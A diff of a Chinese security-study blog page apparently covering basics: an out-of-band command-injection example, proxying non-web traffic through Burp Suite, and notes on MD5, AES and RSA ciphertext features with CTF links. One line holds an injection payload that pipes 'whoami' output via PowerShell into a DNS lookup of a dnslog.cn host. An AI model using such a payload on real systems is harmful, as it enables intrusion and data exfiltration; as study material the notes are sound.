@@ -209,12 +209,72 @@
 </li>
 </ul>
 <ol>
-<li>带外查询<br>  使用网址<a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a><br>  <img src="/2023/07/15/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/11.png" alt="11"><br>  在ping的时候带上这个网址，就会在那个网站上显示出来<br>  <img src="/2023/07/15/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/22.png" alt="22"><br>  但是因为反引号命令是linux里的，所以windows无法使用<br>  windows要使用powershell变量赋值，并且\会影响ping，所以我们可以构造<code>127.0.0.1 | powershell $x=whoami;$x=$x.Replace(&#39;\&#39;,&#39;xxx&#39;);$y=&#39;.q8wzba.dnslog.cn&#39;;$z=$x+$y;ping $z</code></li>
+<li>带外查询<br> 使用网址<a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a><br> <img src="/2023/07/15/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/11.png" alt="11"><br> 在ping的时候带上这个网址，就会在那个网站上显示出来<br> <img src="/2023/07/15/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/22.png" alt="22"><br> 但是因为反引号命令是linux里的，所以windows无法使用<br> windows要使用powershell变量赋值，并且\会影响ping，所以我们可以构造<code>127.0.0.1 | powershell $x=whoami;$x=$x.Replace(&#39;\&#39;,&#39;xxx&#39;);$y=&#39;.q8wzba.dnslog.cn&#39;;$z=$x+$y;ping $z</code></li>
 </ol>
 <p>  <img src="/2023/07/15/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/333.png" alt="333"></p>
 <ol start="2">
 <li>反弹shell</li>
 </ol>
+<ul>
+<li><p>抓非web，但是是http的包</p>
+<ol>
+<li><p>用charles+burpsuite：charles-&gt;proxy-&gt;external proxy setting-&gt;除了socks proxy其他全勾上，设置127.0.0.1和与burpsuite一样的端口-&gt;burpsuites设置127.0.0.1和端口就可以了</p>
+</li>
+<li><p>用proxifier+burpsuite：proxifier-&gt;配置文件-&gt;代理服务器127.0.0.1和端口和bp对应，协议选https。再配置文件-&gt;代理规则-&gt;应用程序写应用进程名，可以在任务管理器里看（eg：wechat*.exe），动作选刚刚添加的ip和端口。burpsuites设置127.0.0.1和端口就可以了</p>
+</li>
+<li><p>设置里添加代理</p>
+</li>
+</ol>
+</li>
+<li><p>抓非http的包：科来（分类好）-&gt;实时分析&#x2F;wireshark（好分析   ）</p>
+</li>
+<li><p>加密</p>
+</li>
+</ul>
+<ol>
+<li>单向散列加密 -MD5</li>
+</ol>
+<p>  单向散列加密算法的优点有(以MD5为例)：</p>
+<p>  方便存储，损耗低：加密&#x2F;加密对于性能的损耗微乎其微。</p>
+<p>  单向散列加密的缺点就是存在暴力破解的可能性，最好通过加盐值的方式提高安全性，此外可能存在散列冲突。我们都知道MD5加密也是可以破解的。</p>
+<p>  常见的单向散列加密算法有：</p>
+<p>  MD5 SHA MAC CRC</p>
+<ol start="2">
+<li>对称加密 -AES</li>
+</ol>
+<p>  对称加密优点是算法公开、计算量小、加密速度快、加密效率高。</p>
+<p>  缺点是发送方和接收方必须商定好密钥，然后使双方都能保存好密钥，密钥管理成为双方的负担。</p>
+<p>  常见的对称加密算法有：</p>
+<p>  DES AES RC4</p>
+<ol start="3">
+<li>非对称加密 -RSA</li>
+</ol>
+<p>  非对称加密的优点是与对称加密相比，安全性更好，加解密需要不同的密钥，公钥和私钥都可进行相互的加解密。</p>
+<p>  缺点是加密和解密花费时间长、速度慢，只适合对少量数据进行加密。</p>
+<p>  常见的非对称加密算法：</p>
+<p>  RSA RSA2 PKCS</p>
+<p>  加密解密-识别特征&amp;解密条件</p>
+<p>  MD5密文特点：</p>
+<p>  1、由数字“0-9”和字母“a-f”所组成的字符串</p>
+<p>  2、固定的位数 16 和 32位</p>
+<p>  解密需求：密文即可，但复杂明文可能解不出</p>
+<p>  BASE64编码特点：</p>
+<p>  0、大小写区分，通过数字和字母的组合</p>
+<p>  1、一般情况下密文尾部都会有两个等号，明文很少的时候则没有</p>
+<p>  2、明文越长密文越长，一般不会出现”&#x2F;“”+”在密文中</p>
+<p>  AES、DES密文特点：</p>
+<p>  同BASE64基本类似，但一般会出现”&#x2F;“和”+”在密文中</p>
+<p>  解密需求：密文，模式，加密Key，偏移量，条件满足才可解出</p>
+<p>  RSA密文特点：</p>
+<p>  特征同AES,DES相似，但是长度较长</p>
+<p>  解密需求：密文，公钥或私钥即可解出</p>
+<p>  其他密文特点见：</p>
+<p>  1.30余种加密编码类型的密文特征分析</p>
+<p>  <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAwNDcxMjI2MA==&amp;mid=2247484455&amp;idx=1&amp;sn=e1b4324ddcf7d6123be30d9a5613e17b&amp;chksm=9b26f60cac517f1a920cf3b73b3212a645aeef78882c47957b9f3c2135cb7ce051c73fe77bb2&amp;mpshare=1&amp;scene=23&amp;srcid=1111auAYWmr1N0NAs9Wp2hGz&amp;sharer_sharetime=1605145141579&amp;sharer_shareid=5051b3eddbbe2cb698aedf9452370026#rd">https://mp.weixin.qq.com/s?__biz=MzAwNDcxMjI2MA==&amp;mid=2247484455&amp;idx=1&amp;sn=e1b4324ddcf7d6123be30d9a5613e17b&amp;chksm=9b26f60cac517f1a920cf3b73b3212a645aeef78882c47957b9f3c2135cb7ce051c73fe77bb2&amp;mpshare=1&amp;scene=23&amp;srcid=1111auAYWmr1N0NAs9Wp2hGz&amp;sharer_sharetime=1605145141579&amp;sharer_shareid=5051b3eddbbe2cb698aedf9452370026#rd</a></p>
+<p>  2.CTF中常见密码题解密网站总结</p>
+<p>  <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41638851/article/details/100526839">https://blog.csdn.net/qq_41638851/article/details/100526839</a></p>
+<p>  3.CTF密码学常见加密解密总结</p>
+<p>  <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40837276/article/details/83080460">https://blog.csdn.net/qq_40837276/article/details/83080460</a></p>
 
                 </section>
 
@@ -227,7 +287,12 @@
 
             
             <nav class="dis_flex al_post_nav">
-                <a class="al_post_nav_item dis_flex_acenter" href="/">
+                <a class="al_post_nav_item dis_flex_acenter" href="/2023/07/21/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
+                    
+                        <svg class="al_arrow">
+                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-left"></use>
+                        </svg>
+                        <span class="al_text_ellipsis al_post_nav_desc">信息搜集</span>
                     
                 </a>
                 <a class="al_post_nav_item dis_flex_acenter" href="/2023/07/12/hw%E9%9D%A2%E8%AF%95/">
